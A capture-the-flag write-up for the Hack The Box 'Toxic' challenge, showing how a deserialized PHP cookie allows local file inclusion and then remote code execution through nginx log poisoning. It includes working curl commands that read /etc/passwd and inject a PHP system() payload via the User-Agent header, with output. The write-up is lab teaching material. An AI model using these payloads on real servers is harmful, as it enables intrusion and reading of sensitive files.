---
title: "Toxic"
date: 2023-02-17
link: https://app.hackthebox.com/challenges/224
tags:
- writeups
---

**Description**: Humanity has exploited our allies, the dart frogs, for far too long, take back the freedom of our lovely poisonous friends. Malicious input is out of the question when dart frogs meet industrialization.

## Examining The Source
For this challenge we're given the source code. There are 2 files which seem of interest: `index.php` and `PageModel.php`

![[write-ups/images/Pasted image 20230217163856.png]]

We set a cookie called `PHPSESSID` with [setcookie](https://www.php.net/manual/en/function.setcookie.php) in case it didn't exist and the cookie's value is being set to the base64 encoding of a serialized object called `$page` of type `PageModel` which has a property of `$file` set to `/www/index.html`. Also, notice that [include](https://www.php.net/manual/en/function.include.php) on the `$file` is called upon the object's [destruction](https://www.phptutorial.net/php-oop/php-destructor/), which means that the content of `index.html` is being displayed in the browser & any PHP blocks contained in that file will be executed.

If the cookie already exists, its value is decoded from base64 & [unserialized](https://www.php.net/manual/en/function.unserialize.php) back to a PHP object value.

## [Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion) Exploitation
There are multiple red flags in this source code, but the most obvious one is the fact that the file being displayed *(`index.html`)* is completely in the control of the user, since `PHPSESSID`'s value can be modified by the user. 

Now let's see how can we exploit this by firstly having a look @ our cookie:
```bash
┌─[evilBit@parrot]─[~/Desktop]
└──╼ echo "Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9" | base64 -d
O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}
```

The result is a serialized object of type `Pagemodel` with the property of `file` set when the cookie was created. As a starting point we can simply modify the serialized object path, base64 encode it & send the new `PHPSESSID` value to read any arbitrary file on the server:
```bash

┌─[evilBit@parrot]─[~/Desktop]
└──╼ echo 'O:9:"PageModel":1:{s:4:"file";s:11:"/etc/passwd";}' | base64
Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2V0Yy9wYXNzd2QiO30lCg==
┌─[evilBit@parrot]─[~/Desktop]
└──╼  curl 'http://localhost:1337/' -H "Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2V0Yy9wYXNzd2QiO30lCg=="
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
www:x:1000:1000:1000:/home/www:/bin/sh
nginx:x:100:101:nginx:/var/lib/nginx:/sbin/nologin
```

Keep in mind that our objective is to retrieve the `flag` file. However, if we try changing the path to `/flag` it will not work. Why is that? Well, apparently there's a catch: a bash script `entrypoint.sh` is executed when the web app is built, making the flag filename random:
```bash
#!/bin/ash

# Secure entrypoint
chmod 600 /entrypoint.sh

# Generate random flag filename
mv /flag /flag_`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1`

exec "$@"
```

## LFI to RCE
At this point we need to find a way to execute code on the remote system, rather than brute-forcing our way to it. In order to do that, let's take a step back & think about what we control: that is arbitrarily reading & executing any file. 

The challenge name *(Toxic)* hints us to what we should do next: [log poisoning](https://casimsec.com/2021/10/30/log-poisoning-and-lfi/). Simply put, log poisoning is a technique used to execute code injected into a log file. But how are we going to inject code, since LFI only allows us to read/execute a file on the server, not write one? Well, we can write to a server log file indirectly by finding if any other input is reflected.

Firstly, let's detect which web server is running to find our log file & access it:

![[write-ups/images/Pasted image 20230217172241.png]]

Ok, that was easier than anticipated wince it's right there in the response headers. Looking online we find that nginx's access log is located in: `/var/log/nginx/access.log`, so let's try displaying it:

```bash
┌─[evilBit@parrot]─[~/Desktop]
└──╼ pay="$(echo 'O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}' | base64 | tr -d '\n')" && curl 'http://localhost:1337/' -H "Cookie: PHPSESSID=$pay"

172.17.0.1 - 200 "GET / HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
172.17.0.1 - 200 "GET /static/images/dart-frog.jpg HTTP/1.1" "http://localhost:1337/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
172.17.0.1 - 200 "GET /static/images/ryan1.png HTTP/1.1" "http://localhost:1337/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
...
172.17.0.1 - 200 "GET / HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
...
172.17.0.1 - 200 "GET / HTTP/1.1" "-" "curl/7.86.0"
172.17.0.1 - 200 "GET / HTTP/1.1" "-" "curl/7.86.0"
```


Note, the last 3 `GET` requests are reflecting our `User-Agent` it seems. This is our way to inject PHP code into the `acess.log` file & have that code executed whenever the server includes that log file *(when `PageModel` object destructs)* & sends it back to our browser:

```bash
┌─[evilBit@parrot]─[~/Desktop]
└──╼ pay="$(echo 'O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}' | base64 | tr -d '\n')" && curl 'http://localhost:1337/' -H "Cookie: PHPSESSID=$pay" -H "User-Agent: <?php system('ls /'); ?>"

172.17.0.1 - 200 "GET / HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 
...
172.17.0.1 - 200 "GET / HTTP/1.1" "-" "curl/7.86.0"

entrypoint.sh
etc
flag_6tMGz
home
...
www
```

And there we have our flag file 🥳. Now all that's left to do is to retrieve it:

![[write-ups/images/Pasted image 20230217173942.png]]

## Refs
- [Log Poisoning and LFI](https://casimsec.com/2021/10/30/log-poisoning-and-lfi/)

## See Also
- [[write-ups/HTB]]
